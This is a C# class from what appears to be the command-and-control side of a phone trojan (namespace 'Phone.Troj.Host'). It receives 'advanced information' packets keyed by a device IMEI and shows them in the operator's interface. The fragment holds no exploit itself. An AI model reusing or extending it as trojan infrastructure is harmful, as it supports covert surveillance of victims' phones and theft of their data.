using System;
using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class AdvInfoHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public AdvInfoHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string imeiId)
        {
        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Information data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (AdvancedInformationPacket)p;
            gui.UpdateAdvInformations(imei, packet);
        }
    }
}
